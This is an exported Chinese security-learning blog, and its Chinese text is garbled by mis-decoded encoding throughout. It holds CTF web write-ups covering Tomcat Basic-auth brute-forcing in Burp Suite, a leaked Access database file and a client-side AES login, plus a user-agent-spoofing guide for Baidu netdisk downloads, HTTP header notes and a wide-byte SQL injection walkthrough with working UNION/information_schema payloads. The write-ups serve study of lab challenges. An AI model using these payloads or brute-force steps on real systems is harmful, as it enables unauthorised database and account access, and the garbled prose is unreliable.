<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $flag&#x3D;&quot;fakeflag&quot;</span><br><span class="line">    $u &#x3D; $_POST[&#39;username&#39;];</span><br><span class="line">    $p &#x3D; $_POST[&#39;pazzword&#39;];</span><br><span class="line">    if(isset($u) &amp;&amp; isset($p))&#123;</span><br><span class="line">        if($u&#x3D;&#x3D;&#x3D;&#39;admin&#39; &amp;&amp; $p &#x3D;&#x3D;&#x3D;&#39;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#39;)&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    --&gt;</span><br></pre></td></tr></table></figure>

<p>å°è¯•ç›´æ¥ç™»é™†ï¼Œå‘ç°å¤±è´¥äº†</p>
<p>å†çœ‹ä¸€ä¸‹æºä»£ç ï¼Œå‘ç°åœ¨å‰ç«¯æœ‰åŠ å¯†è¿‡ç¨‹ğŸ‘‡</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> key = <span class="string">&quot;0000000372619038&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> iv = <span class="string">&quot;ilove36dverymuch&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> pazzword = $(<span class="string">&quot;#pazzword&quot;</span>).val();</span><br><span class="line">    pazzword = encrypt(pazzword,key,iv);</span><br><span class="line">    $(<span class="string">&quot;#pazzword&quot;</span>).val(pazzword);</span><br><span class="line">    $(<span class="string">&quot;#loginForm&quot;</span>).submit();</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params">data,key,iv</span>) </span>&#123; <span class="comment">//key,ivï¼š16ä½çš„å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">var</span> key1  = CryptoJS.enc.Latin1.parse(key);</span><br><span class="line">    <span class="keyword">var</span> iv1   = CryptoJS.enc.Latin1.parse(iv);</span><br><span class="line">    <span class="keyword">return</span> CryptoJS.AES.encrypt(data, key1,&#123;</span><br><span class="line">        iv : iv1,</span><br><span class="line">        mode : CryptoJS.mode.CBC,</span><br><span class="line">        padding : CryptoJS.pad.ZeroPadding</span><br><span class="line">    &#125;).toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å°è¯•ç”¨bpæŠ“åŒ…ğŸ‘‡</p>
<p><img src="https://img.vim-cn.com/8e/5b61bb9500f2a669660e1e12eefd7badadfcab.png" alt="web19.1"></p>
<p>å¯ä»¥çœ‹åˆ°å¯†ç å·²ç»è¢«åŠ å¯†äº†ï¼Œä¸å†æ˜¯è¾“å…¥çš„å¯†ç äº†</p>
<p>å‘é€åˆ°repeateræ¨¡å—å¹¶ä¿®æ”¹å¯†ç å†æ¬¡å‘é€</p>
<p><img src="https://img.vim-cn.com/df/ff750e75bf34d704a84ec0ab4e62f0f92714ea.png" alt="web19.2"></p>
<p>å¾—åˆ°ğŸ‘‡</p>
<p><img src="https://img.vim-cn.com/42/d71e5b9f932b6138796d23e7017830e00f8f63.png" alt="web19.3"></p>
<h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><p>é¢˜ç›®hintï¼š<code>mdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„éœ²ç›¸å½“äºæ•°æ®åº“è¢«è„±è£¤äº†</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ ç›´æ¥æŸ¥çœ‹urlè·¯å¾„æ·»åŠ &#x2F;db&#x2F;db.mdb ä¸‹è½½æ–‡ä»¶é€šè¿‡txtæ‰“å¼€æˆ–è€…é€šè¿‡EasyAccess.exeæ‰“å¼€</span><br></pre></td></tr></table></figure>

<p>æ‰“å¼€åæœç´¢å­—ç¬¦ä¸²ctfshow å³å¯æ‰¾åˆ°flag</p>
<h1 id="çˆ†ç ´"><a href="#çˆ†ç ´" class="headerlink" title="çˆ†ç ´"></a>çˆ†ç ´</h1><h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><p><code>è€ƒç‚¹tomcat è®¤è¯çˆ†ç ´ä¹‹custom iteratorä½¿ç”¨</code></p>
<p>ä¸‹è½½é¢˜ç›®é™„ä»¶å¹¶æ‰“å¼€ï¼Œå‹ç¼©åŒ…ä¸­æœ‰ä¸€ä¸ªå¯†ç å­—å…¸ï¼ˆå¾…ä¼šç”¨å¾—ä¸Š</p>
<p>æ‰“å¼€ç½‘é¡µåè¾“å…¥ç”¨æˆ·åå’Œå¯†ç åç”¨bpæŠ“åŒ…ğŸ‘‡</p>
<p><img src="https://img.vim-cn.com/e0/cd72ec4c36145781cdb617c6d577fee32c6c17.png" alt="web21.1"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è§£ç å‡ºæ¥æ˜¯</span><br><span class="line">admin:123</span><br><span class="line">ç”¨æˆ·å å†’å· å¯†ç </span><br></pre></td></tr></table></figure>

<p>è®¤è¯æˆåŠŸè¿”å›çš„çŠ¶æ€ç æ˜¯200ï¼Œå¤±è´¥åˆ™æ˜¯401</p>
<p>å°†è¯¥æ•°æ®åŒ…å‘é€åˆ°bpçš„çˆ†ç ´æ¨¡å—ï¼Œé€‰ä¸­base64ç¼–ç åçš„ç”¨æˆ·åå’Œå¯†ç </p>
<p>payload set-&gt;custom iterator(è‡ªå®šä¹‰è¿­ä»£å™¨)-&gt;position-&gt;è¾“å…¥å­—å…¸</p>
<p>è‡ªå®šä¹‰è¿­ä»£å™¨å¯ä»¥è‡ªå®šä¹‰æ‹¼æ¥æ–¹å¼ï¼Œè¿™é‡Œæ ¹æ®base64ç¼–ç çš„tomcatå¯†ç çš„æ ¼å¼ä¸º ç”¨æˆ·å+å†’å·+å¯†ç ï¼Œæ‰€ä»¥positionçš„ä½æ•°ä¸º3</p>
<p><img src="https://img.vim-cn.com/f2/dbe11bf029841efb441620f7065989cef8235f.png" alt="position1"></p>
<p><img src="https://img.vim-cn.com/67/d43581be012518a50fa0b367f3b0a417cb8569.png" alt="position2"></p>
<p><img src="https://img.vim-cn.com/66/4bc79c2836dcca996da2f02670d16e863f7bb2.png" alt="position3"></p>
<p>ä¸‰ä¸ªä½ç½®éƒ½è®¾ç½®å®Œæˆåéœ€è¦è¿›è¡Œbase64ç¼–ç ğŸ‘‡</p>
<p><img src="https://img.vim-cn.com/c4/09e5ffb2bde78774308222681b2233e49e7aeb.png" alt="è®¾ç½®base64ç¼–ç "></p>
<p>å–æ¶ˆpayload encodingç¼–ç ğŸ‘‡</p>
<p><img src="https://img.vim-cn.com/a5/f4ade41f434573890040951bb738cd5462d87a.png" alt="å–æ¶ˆpayload encoding"></p>
<p>ä¹‹åå¼€å§‹çˆ†ç ´å°±å¯ä»¥äº†</p>
<p>çˆ†ç ´æˆåŠŸğŸ‘‡</p>
<p><img src="https://img.vim-cn.com/4c/2d9559ede0838314bc7e5f5b64060e00790a7b.png" alt="successï¼"></p>
<h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><p>é¢˜ç›®ï¼š<code>åŸŸåä¹Ÿå¯ä»¥çˆ†ç ´çš„ï¼Œè¯•è¯•çˆ†ç ´è¿™ä¸ª**ctf**.showçš„å­åŸŸå</code></p>
<p>hintï¼š<a href="http://flag.ctfer.com/index.php">http://flag.ctfer.com/index.php</a></p>
<p>è®¿é—®è¢«æ‹’ç»äº†ã€‚ã€‚</p>
<h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><p>é¢˜ç›®ï¼š<code>è¿˜çˆ†ç ´ï¼Ÿè¿™ä¹ˆå¤šä»£ç ï¼Œå‘Šè¾ï¼</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = md5(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+intval(substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===intval(substr(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

























































































































]]></content>
      <categories>
        <category>webåˆ·é¢˜è®°å½•</category>
      </categories>
  </entry>
  <entry>
    <title>ä½¿ç”¨idmä¸‹è½½ç™¾åº¦ç½‘ç›˜æ–‡ä»¶</title>
    <url>/2021/05/25/idm/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>



<p>å‡†å¤‡å·¥ä½œï¼šidmã€<a href="https://greasyfork.org/zh-CN/scripts/403991-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E9%93%BE%E6%8F%90%E5%8F%96-%E5%A4%9A%E9%80%89">Tampermonkeyæ’ä»¶</a></p>
<h1 id="ä¸€ã€é…ç½®IDM"><a href="#ä¸€ã€é…ç½®IDM" class="headerlink" title="ä¸€ã€é…ç½®IDM"></a>ä¸€ã€é…ç½®IDM</h1><p>æ‰“å¼€å®¢æˆ·ç«¯ ç‚¹å‡»å³ä¸Šè§’ä¸‹è½½ï¼Œåœ¨å¼¹å‡ºçš„é€‰é¡¹ä¸­æ‰¾åˆ°æœ€ä¸‹è¾¹çš„<code>é€‰é¡¹</code>è½¬åˆ°é…ç½®ç•Œé¢</p>
<p><img src="https://img.vim-cn.com/c5/fa6d5e4901cf31dd9313aeb236c7e832b7d049.png"></p>
<p>ç‚¹å‡»ä¸‹è½½ï¼Œä¿®æ”¹ç”¨æˆ·ä»£ç†ä¸ºğŸ‘‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netdisk;P2SP;2.2.60.26</span><br></pre></td></tr></table></figure>

<p>ç‚¹å‡»<code>ç¡®å®š</code>ä¿å­˜</p>
<p>ç‚¹å‡»è¿æ¥</p>
<p><img src="https://img.vim-cn.com/89/8a4b17ee04e32945c5c0b5a199d039d111e6a6.png"></p>
<p>ç‚¹æ–°å»ºï¼Œåœ¨å¼¹å‡ºçš„çª—å£ä¸­è¾“å…¥<code>*.baidupcs.com</code>ï¼Œå‰ç¼€åˆ‡æ¢ä¸º<code>https://</code>ä¿®æ”¹æœ€å¤§è¿æ¥æ•°ä¸º2</p>
<p>ç‚¹å‡»<code>ç¡®å®š</code>ä¿å­˜</p>
<h1 id="äºŒã€å®‰è£…æ²¹çŒ´è„šæœ¬"><a href="#äºŒã€å®‰è£…æ²¹çŒ´è„šæœ¬" class="headerlink" title="äºŒã€å®‰è£…æ²¹çŒ´è„šæœ¬"></a>äºŒã€å®‰è£…æ²¹çŒ´è„šæœ¬</h1><p><a href="https://greasyfork.org/zh-CN/scripts/403991-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E9%93%BE%E6%8F%90%E5%8F%96-%E5%A4%9A%E9%80%89">Tampermonkeyæ’ä»¶</a></p>
<h1 id="ä¸‰ã€ä¸‹è½½"><a href="#ä¸‰ã€ä¸‹è½½" class="headerlink" title="ä¸‰ã€ä¸‹è½½"></a>ä¸‰ã€ä¸‹è½½</h1><p><img src="https://img.vim-cn.com/90/8e9acd0ccc1faaefb29786432d994430a4baa9.png"></p>
<p>å‘ç°å¤šäº†ä¸€ä¸ªæŒ‰é’®ï¼Œç‚¹å‡»é€‰æ‹©apiä¸‹è½½å³å¯è‡ªåŠ¨å¼¹å‡ºidmçª—å£ï¼ˆè®°å¾—å…ˆæ‰“å¼€idm</p>
]]></content>
      <categories>
        <category>å·¥å…·ä½¿ç”¨</category>
      </categories>
  </entry>
  <entry>
    <title>ä»0å¼€å§‹å­¦web(ä¸€) httpç¯‡</title>
    <url>/2021/04/29/http/</url>
    <content><![CDATA[<p><font color=#999AAA >æœ€è¿‘æ‰“ç®—é‡æ–°å¼€å§‹ä»å¤´å­¦webï¼Œç®€å•è®°å½•ä¸€ä¸‹</font></p>
<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>


<p><img src="https://img-blog.csdnimg.cn/20210326090723497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h1 id="å…³äºCRLF"><a href="#å…³äºCRLF" class="headerlink" title="å…³äºCRLF"></a>å…³äºCRLF</h1><p>CRLFæ˜¯CRå’ŒLFä¸¤ä¸ªå­—ç¬¦çš„æ‹¼æ¥ï¼Œå®ƒä»¬åˆ†åˆ«ä»£è¡¨â€å›è½¦+æ¢è¡Œâ€ï¼ˆ\r\nï¼‰â€œï¼Œå…¨ç§°ä¸ºCarriage Return/Line Feedâ€ï¼Œåå…­è¿›åˆ¶ç¼–ç åˆ†åˆ«ä¸º0x0då’Œ0x0aï¼ŒURLç¼–ç ä¸º%0Då’Œ%0Aã€‚CRå’ŒLFç»„åˆåœ¨ä¸€èµ·å³CRLFå‘½ä»¤ï¼Œå®ƒè¡¨ç¤ºé”®ç›˜ä¸Šçš„â€Enterâ€é”®ï¼Œè®¸å¤šåº”ç”¨ç¨‹åºå’Œç½‘ç»œåè®®ä½¿ç”¨è¿™äº›å‘½ä»¤ä½œä¸ºåˆ†éš”ç¬¦ã€‚</p>
<p>æœ‰å…³CRLFæ³¨å…¥æ”»å‡»çš„ç›¸å…³çŸ¥è¯†éšåå†åšè®°å½•</p>
<p>crlfæ³¨å…¥ã€<a href="https://baike.baidu.com/item/CRLF%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/14696969?fr=aladdin">ç™¾åº¦ç™¾ç§‘</a>ã€‘</p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h1 id="HTTPå¤´"><a href="#HTTPå¤´" class="headerlink" title="HTTPå¤´"></a>HTTPå¤´</h1><p>æœ‰å…³httpçš„è¯¦ç»†å†…å®¹ã€<a href="https://www.runoob.com/http/http-tutorial.html">ä¼ é€é—¨</a>ã€‘<br><img src="https://img-blog.csdnimg.cn/20210327124144706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2><p> HTTP Refereræ˜¯headerçš„ä¸€éƒ¨åˆ†ï¼Œå½“æµè§ˆå™¨å‘webæœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¼šå¸¦ä¸ŠRefererï¼Œå‘Šè¯‰æœåŠ¡å™¨è¯¥ç½‘é¡µæ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„ï¼ŒæœåŠ¡å™¨å› æ­¤å¯ä»¥è·å¾—ä¸€äº›ä¿¡æ¯ç”¨äºå¤„ç†ã€‚</p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h2 id="XFF"><a href="#XFF" class="headerlink" title="XFF"></a>XFF</h2><p>X-Forwarded-For:<br>ç®€ç§°XFFå¤´ï¼Œå®ƒä»£è¡¨å®¢æˆ·ç«¯ï¼Œä¹Ÿå°±æ˜¯HTTPçš„è¯·æ±‚ç«¯çœŸå®çš„IPï¼Œåªæœ‰åœ¨é€šè¿‡äº†HTTP ä»£ç†æˆ–è€…è´Ÿè½½å‡è¡¡æœåŠ¡å™¨æ—¶æ‰ä¼šæ·»åŠ è¯¥é¡¹ã€‚æ ‡å‡†æ ¼å¼å¦‚ä¸‹ï¼šX-Forwarded-For: client1, proxy1, proxy2ã€‚æœ€å·¦è¾¹(client1)æ˜¯æœ€åŸå§‹å®¢æˆ·ç«¯çš„IPåœ°å€, ä»£ç†æœåŠ¡å™¨æ¯æˆåŠŸæ”¶åˆ°ä¸€ä¸ªè¯·æ±‚ï¼Œå°±æŠŠè¯·æ±‚æ¥æºIPåœ°å€æ·»åŠ åˆ°å³è¾¹ã€‚</p>
<p>å¦‚æœä¸€ä¸ª HTTP è¯·æ±‚åˆ°è¾¾æœåŠ¡å™¨ä¹‹å‰ï¼Œç»è¿‡äº†ä¸‰ä¸ªä»£ç† Proxy1ã€Proxy2ã€Proxy3ï¼Œipåˆ†åˆ«ä¸º ip1ã€ip2ã€ip3ï¼Œç”¨æˆ·çœŸå® ip ä¸º ip0ï¼Œé‚£ä¹ˆæŒ‰ç…§ XFF æ ‡å‡†ï¼ŒæœåŠ¡ç«¯æœ€ç»ˆä¼šæ”¶åˆ°è¿™æ ·ä¿¡æ¯ï¼šX-Forwarded-For: ip0, ip1, ip2</p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h2 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h2><p>User Agentä¸­æ–‡åä¸ºç”¨æˆ·ä»£ç†ï¼Œç®€ç§° UAï¼Œå®ƒæ˜¯ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ä¸²å¤´ï¼Œä½¿å¾—æœåŠ¡å™¨èƒ½å¤Ÿè¯†åˆ«å®¢æˆ·ä½¿ç”¨çš„æ“ä½œç³»ç»ŸåŠç‰ˆæœ¬ã€CPU ç±»å‹ã€æµè§ˆå™¨åŠç‰ˆæœ¬ã€æµè§ˆå™¨æ¸²æŸ“å¼•æ“ã€æµè§ˆå™¨è¯­è¨€ã€æµè§ˆå™¨æ’ä»¶ç­‰ã€‚</p>
<p>User-Agenté€šå¸¸æ ¼å¼ï¼š</p>
<pre><code>Mozilla/5.0 (å¹³å°) å¼•æ“ç‰ˆæœ¬ æµè§ˆå™¨ç‰ˆæœ¬å·
</code></pre>
<p><a href="http://www.mybatis.cn/archives/1238.html">User-Agentçš„ä¼ªé€ </a></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>Cookieï¼Œæœ‰æ—¶ä¹Ÿç”¨å…¶å¤æ•°å½¢å¼ Cookiesã€‚ç±»å‹ä¸ºâ€œå°å‹æ–‡æœ¬æ–‡ä»¶â€ï¼Œæ˜¯æŸäº›ç½‘ç«™ä¸ºäº†è¾¨åˆ«ç”¨æˆ·èº«ä»½ï¼Œè¿›è¡ŒSessionè·Ÿè¸ªè€Œå‚¨å­˜åœ¨ç”¨æˆ·æœ¬åœ°ç»ˆç«¯ä¸Šçš„æ•°æ®ï¼ˆé€šå¸¸ç»è¿‡åŠ å¯†ï¼‰ï¼Œç”±ç”¨æˆ·å®¢æˆ·ç«¯è®¡ç®—æœºæš‚æ—¶æˆ–æ°¸ä¹…ä¿å­˜çš„ä¿¡æ¯ã€‚å­˜å‚¨åœ¨ä½ ç”µè„‘ä¸Šçš„cookieså°±å¥½æ¯”ä¸€å¼ èº«ä»½å‡­è¯æˆ–è€…ä¸€æŠŠé’¥åŒ™ã€‚</p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">


<h2 id="æœ‰å…³xffåŠrefererä¼ªé€ "><a href="#æœ‰å…³xffåŠrefererä¼ªé€ " class="headerlink" title="æœ‰å…³xffåŠrefererä¼ªé€ "></a>æœ‰å…³xffåŠrefererä¼ªé€ </h2><p>é¢˜ç›®ï¼šæ”»é˜²ä¸–ç•Œ  xff_referer  ã€<a href="https://adworld.xctf.org.cn/">ä¼ é€é—¨</a>ã€‘<br><font color=#999AAA >WPåœ¨è¿™é‡Œå°±ä¸å†™äº†ï¼Œæœ‰å›°éš¾è‡ªè¡Œç™¾åº¦</font></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h1 id="httpå“åº”ç "><a href="#httpå“åº”ç " class="headerlink" title="httpå“åº”ç "></a>httpå“åº”ç </h1><p>è¯¦ç»†å†…å®¹ã€<a href="https://www.runoob.com/http/http-status-codes.html">ä¼ é€é—¨</a>ã€‘</p>
]]></content>
      <categories>
        <category>webå­¦ä¹ </category>
      </categories>
  </entry>
  <entry>
    <title>å®½å­—èŠ‚æ³¨å…¥</title>
    <url>/2021/05/18/kuan/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>


<h1 id="ä¸€ã€ä»€ä¹ˆæ˜¯å®½å­—èŠ‚æ³¨å…¥ï¼Ÿ"><a href="#ä¸€ã€ä»€ä¹ˆæ˜¯å®½å­—èŠ‚æ³¨å…¥ï¼Ÿ" class="headerlink" title="ä¸€ã€ä»€ä¹ˆæ˜¯å®½å­—èŠ‚æ³¨å…¥ï¼Ÿ"></a>ä¸€ã€ä»€ä¹ˆæ˜¯å®½å­—èŠ‚æ³¨å…¥ï¼Ÿ</h1><p><img src="https://img-blog.csdnimg.cn/20210113171352374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20210113171400407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20210113171412165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h1 id="äºŒã€ç»ƒä¹ "><a href="#äºŒã€ç»ƒä¹ " class="headerlink" title="äºŒã€ç»ƒä¹ "></a>äºŒã€ç»ƒä¹ </h1><h2 id="é¢˜ç›®é“¾æ¥ï¼š"><a href="#é¢˜ç›®é“¾æ¥ï¼š" class="headerlink" title="é¢˜ç›®é“¾æ¥ï¼š"></a>é¢˜ç›®é“¾æ¥ï¼š</h2><p><a href="http://chinalover.sinaapp.com/SQL-GBK/">http://chinalover.sinaapp.com/SQL-GBK/</a></p>
<p>sqli-labs ç¬¬32å…³(æ²¡æœ‰æ­å»ºçš„è¯å¯ä»¥å»<a href="https://buuoj.cn/challenges#sqli-labs">buuctfæ‰¾basicä¸­çš„sqli-labs</a>)[è¿™ä¸ªå¯ä»¥é…åˆç†è§£ï¼Œè‡ªè¡Œæ“ä½œæ•ˆæœæä½³]</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><img src="https://img-blog.csdnimg.cn/20210113172133600.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>éšä¾¿è¾“ä¸ªid<br><img src="https://img-blog.csdnimg.cn/20210113172209227.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å°è¯•ç”¨å•å¼•å·é—­åˆ<br><img src="https://img-blog.csdnimg.cn/20210113172237782.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°â€˜ â€˜ â€™(å•å¼•å·)è½¬å˜æˆäº†â€˜ \â€˜ â€™(åæ–œæ +å•å¼•å·)<br>é‚£å°±ç»“åˆä»Šå¤©æ‰€å­¦çŸ¥è¯†è¿›è¡Œæ“ä½œ<br>é¦–å…ˆåˆ©ç”¨order by è¯­å¥è¿›è¡ŒæŸ¥è¯¢</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 order by 1%23</span><br></pre></td></tr></table></figure>
<p>ç»“æœå¦‚ä¸‹ï¼š<br><img src="https://img-blog.csdnimg.cn/20210113172707300.png" alt="![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://img-blog.csdnimg.cn/20210113172529680.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 order by 2%23</span><br></pre></td></tr></table></figure>
<p>ç»“æœå¦‚ä¸‹ï¼š<br><img src="https://img-blog.csdnimg.cn/20210113172651674.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 order by 3%23</span><br></pre></td></tr></table></figure>
<p>ç»“æœå¦‚ä¸‹ï¼š<br><img src="https://img-blog.csdnimg.cn/20210113172637974.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>3çš„è¯å‡ºç°æŠ¥é”™è¯´æ˜åªæœ‰2ä¸ªå­—æ®µ</p>
<p>æ¥ç€åˆ©ç”¨union selectè¯­å¥æŸ¥è¯¢æ•°æ®åº“</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 union select 1,database()%23</span><br></pre></td></tr></table></figure>
<p>ç»“æœå¦‚ä¸‹ï¼š<br><img src="https://img-blog.csdnimg.cn/20210113172929536.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœ‰äº†æ•°æ®åº“åä¹‹åæ¥ç€å¾€ä¸‹æŸ¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23</span><br></pre></td></tr></table></figure>

<p>ç»“æœå¦‚ä¸‹ï¼š<br><img src="https://img-blog.csdnimg.cn/20210113173125851.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ¥ç€æŸ¥ctf4ï¼ˆå…¶ä½™å‡ ä¸ªæœ‰å…´è¶£ä¹Ÿå¯ä»¥æŸ¥ä¸€ä¸‹çœ‹çœ‹ï¼Œç»™å‡ºctf4æ˜¯å› ä¸ºé‡Œè¾¹æœ‰flagï¼‰</p>
<p>è¿™é‡Œç»™ctf4è½¬ä¸ºäº†16è¿›åˆ¶ï¼ˆè®°å¾—åœ¨å‰è¾¹åŠ ä¸Š0xï¼‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27%20union%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name&#x3D;0x63746634%23</span><br></pre></td></tr></table></figure>
